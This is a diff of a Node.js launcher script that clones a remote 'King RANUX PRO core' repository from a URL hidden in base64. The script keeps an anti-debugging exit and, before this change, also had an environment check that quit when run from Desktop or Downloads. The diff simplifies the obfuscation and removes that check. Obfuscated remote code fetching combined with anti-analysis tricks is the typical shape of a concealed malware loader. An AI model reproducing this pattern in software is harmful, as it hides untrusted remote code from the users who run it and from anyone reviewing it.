@@ -7,19 +7,12 @@ if (process.execArgv.join("").includes("inspect")) {
   process.exit(1);
 }
 
-function buildHiddenString() {
-  return "YUhSMGNITTZMeTl1WVdoMGIyUjNiaTVqYjIwdkwzSjRZbkpwWkdobExXUmxkaTl1ZUMxaWNtbGtZMlV1WjJsMA==";
-}
-
-const STEP1 = Buffer.from(buildHiddenString(), "base64").toString("utf-8");
-const CORE_URL = Buffer.from(STEP1, "base64").toString("utf-8");
+const CORE_URL = Buffer.from(
+  "aHR0cHM6Ly9naXRodWIuY29tL3J4YnJpZGdlLWRldi9ueC1icmlkZ2UuZ2l0",
+  "base64"
+).toString("utf-8");
 
 const CORE_DIR = path.join(__dirname, "core");
-
-if (__dirname.includes("Desktop") || __dirname.includes("Downloads")) {
-  console.log("Unauthorized environment detected.");
-  process.exit(1);
-}
 
 try {
   console.log("Clearing npm cache...");
@@ -34,6 +27,7 @@ if (fs.existsSync(CORE_DIR)) {
 }
 
 console.log("Downloading latest King RANUX PRO core...");
+console.log("Repo:", CORE_URL);
 
 try {
   execSync(`git clone ${CORE_URL} core`, { stdio: "inherit" });
